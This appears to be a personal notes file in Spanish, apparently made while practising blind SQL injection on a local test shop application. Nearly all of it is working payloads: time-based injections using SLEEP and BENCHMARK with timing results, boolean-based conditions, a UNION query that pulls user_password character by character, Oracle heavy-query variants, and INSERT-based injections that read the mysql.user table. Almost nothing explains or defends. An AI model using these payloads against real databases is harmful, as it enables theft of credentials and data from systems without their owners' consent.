
#select * from productos where id=-1 or 0=if(substring((select id from productos limit 0,1),1,1)= char(49),sleep(5),1)
http://127.0.0.1/sql_injeccion_por_get/tienda2.php?id_producto=1%20and%201=(select%20if(mid(id,1,1)=char(49),false,%27false%27)%20from%20productos%20limit%200,1)

and 1=if(substring((select id from productos limit 0,1),1,1)= char(49),1,0)
/*
https://www.exploit-db.com/exploits/13101/

ASCII 32-126

65-90 = abecedario Mayusculas.
97-122 = abecedario Minusculas.
48-57 = numeros 0-9

######### CARACTERES ESPECIALES  ######
32-47
58-64
91-96
123-126
######### ####################  ######

*/
#blind sql
#and 123=123 and 'asdas'='asdas'
#and sleep(5) and 1=1
#BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))
#/**/and/**/BENCHMARK(800000,ENCODE('MSG','by/**/5/**/seconds'))


#SELECT  IF(SUBSTRING(id,1,1) = CHAR(50),'VALIDO','INCORRECTO') FROM productos limit 0,1;
#select if(mid(id,1,1)=char(49),'bien','false') from productos limit 0,1


#1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
#//para ver el codigo ascii http://informatica.dgenp.unam.mx/recomendaciones/codigo-ascii
####################################################################################################


5000000-------> BENCHMARK
4.00 sec
3.86 sec
3.87 sec


100000000 = 19.52 sec

select if(mid(id,1,1)=char(49),true,'false') from productos limit 0,1


select 0=sleep(5); ========= true
select length('hola');


AND 0=(SELECT * FROM (SELECT(SLEEP(5)))NVlG)

and 0=(select sleep(5))
###########################

#select ascii('1');
#select if((select if(mid(id,1,1)=char(49),true,'false') from productos limit 0,1),'todo bienn','todo mal')


 (select count(*) from all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)>0 and 300>ascii(SUBSTR((select username from all_users where rownum = 1),1,1)

 exists (select * from contrasena) and 300 > (select count(*) from information_schema.columns, information_schema.columns T1, information_schema T2)



 INSERT INTO table VALUES ('stat','1' and 1=if(ascii(lower(substring((select users from mysql.user limit 1),1,1)))>=1,1,benchmark(999999,md5(now()))) )/* ,'stat2');
 INSERT INTO table VALUES ('stat','1' and 1=if(ascii(lower(substring((select users from mysql.user limit 1),1,1)))>=254,1,benchmark(999999,md5(now()))) )/* ,'stat2');















blooleanos con OR
http://127.0.0.1/sql_injeccion_blind/tiendarandom.php?id_producto=0' or 1=1 and [true] and '1'='1